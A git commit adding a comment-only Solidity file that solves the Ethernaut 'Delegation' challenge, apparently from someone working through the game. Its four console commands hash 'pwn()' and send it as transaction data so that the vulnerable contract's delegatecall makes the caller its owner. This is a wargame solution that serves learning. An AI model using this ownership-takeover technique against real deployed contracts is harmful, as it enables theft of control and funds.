b9ec4b8b75ad8e55a59257f54b5fd03bbe11ab76
Your Name <you@example.com>
2022-09-18 20:40:52 +1000

    Delegation attack

---
+++ contracts/DelegationAttack.sol
@@ -0,0 +1,12 @@
+/// @title Code to attack the Delegation smart contract in Ethernaut
+/// @author RedGraz
+/// @dev This could only be done through browsers developer tools as attacking
+/// through another smart contract the owner is getting set the calling contract's address
+
+// await contract.owner()
+
+// var pwnDelegation = web3.utils.keccak256("pwn()")
+
+// contract.sendTransaction({data: pwnDelegation})
+
+// await contract.owner()
